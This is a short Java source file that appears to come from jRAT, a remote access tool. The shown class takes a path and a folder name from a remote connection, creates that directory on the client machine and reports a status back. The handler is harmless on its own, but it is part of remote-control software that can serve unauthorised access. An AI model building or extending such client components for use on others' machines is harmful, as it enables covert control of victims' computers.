package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.common.Constants;

import java.io.File;


public class Packet43CreateDirectory implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String where = con.readLine();
		String name = con.readLine();

		File file = new File(where + File.separator + name);
		file.mkdirs();
		con.status(Constants.STATUS_MKDIR);
	}

}
